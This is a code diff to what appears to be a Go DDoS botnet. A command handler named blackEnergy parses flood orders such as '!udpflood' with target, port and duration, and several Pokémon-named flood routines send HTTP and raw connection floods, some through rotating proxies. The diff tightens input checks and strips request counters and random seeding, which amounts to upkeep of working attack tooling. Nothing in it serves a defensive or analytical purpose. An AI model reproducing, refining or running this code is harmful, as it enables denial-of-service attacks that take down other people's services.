@@ -139,12 +139,12 @@ func blackEnergy(conn net.Conn, command string) error {
 		}
 		target := fields[1]
 		targetPort, err := strconv.Atoi(fields[2])
-		if err != nil || targetPort < 0 || targetPort > 65535 {
+		if err != nil || targetPort <= 0 || targetPort > 65535 {
 			return fmt.Errorf("invalid port: %s", fields[2])
 		}
 		duration, err := strconv.Atoi(fields[3])
-		if err != nil || duration <= 0 {
-			return fmt.Errorf("invalid duration: %s", fields[3])
+		if err != nil || duration < 5 {
+			return fmt.Errorf("invalid duration (min 5s): %s", fields[3])
 		}
 		switch cmd {
 		case "!udpflood":
@@ -1042,11 +1042,10 @@ func alakazam(target string, targetPort, duration int) {
 //   - duration: Attack duration in seconds
 //   - useProxy: Enable proxy rotation from loaded proxy list
 func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
-	rand.Seed(time.Now().UnixNano())
+
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var requestCount int64
 	var wg sync.WaitGroup
 	resolvedIP, err := lucario(target)
 	if err != nil {
@@ -1109,7 +1108,6 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 					if resp != nil {
 						resp.Body.Close()
 					}
-					atomic.AddInt64(&requestCount, 1)
 				}
 			}
 		}()
@@ -1135,11 +1133,10 @@ func machamp(target string, targetPort, duration int) {
 //   - duration: Attack duration in seconds
 //   - useProxy: Enable proxy mode using loaded proxy list
 func machampProxy(target string, targetPort, duration int, useProxy bool) {
-	rand.Seed(time.Now().UnixNano())
+
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var requestCount int64
 	var wg sync.WaitGroup
 	hostname := target
 	hostname = strings.TrimPrefix(hostname, "https://")
@@ -1205,8 +1202,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 							io.Copy(io.Discard, resp.Body)
 							resp.Body.Close()
 						}
-						atomic.AddInt64(&requestCount, 1)
-					}
+						}
 				}
 			}()
 		}
@@ -1269,8 +1265,7 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 						if _, err := conn.Write([]byte(reqBuilder.String())); err != nil {
 							break
 						}
-						atomic.AddInt64(&requestCount, 1)
-					}
+						}
 					conn.Close()
 				}
 			}
@@ -1479,11 +1474,10 @@ func gyarados(target string, targetPort, duration int) {
 //   - duration: Attack duration in seconds
 //   - useProxy: Enable proxy rotation for each session
 func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
-	rand.Seed(time.Now().UnixNano())
+
 	stopCh := raichu()
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var requestCount int64
 	var wg sync.WaitGroup
 	hostname := target
 	hostname = strings.TrimPrefix(hostname, "https://")
@@ -1540,7 +1534,6 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 						io.Copy(io.Discard, resp.Body)
 						resp.Body.Close()
 					}
-					atomic.AddInt64(&requestCount, 1)
 				}
 			}
 		}()
@@ -1562,7 +1555,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 //   - targetPort: Target TCP port
 //   - duration: Attack duration in seconds
 func dragonite(targetIP string, targetPort, duration int) {
-	rand.Seed(time.Now().UnixNano())
+
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
 		return
@@ -1616,7 +1609,7 @@ func dragonite(targetIP string, targetPort, duration int) {
 //
 // Returns: error if target resolution fails
 func tyranitar(targetIP string, targetPort int, duration int) error {
-	rand.Seed(time.Now().UnixNano())
+
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
 		return err
@@ -1670,7 +1663,7 @@ func tyranitar(targetIP string, targetPort int, duration int) error {
 //
 // Returns: error if target resolution fails
 func metagross(targetIP string, duration int) error {
-	rand.Seed(time.Now().UnixNano())
+
 	resolvedIP, err := lucario(targetIP)
 	if err != nil {
 		return err
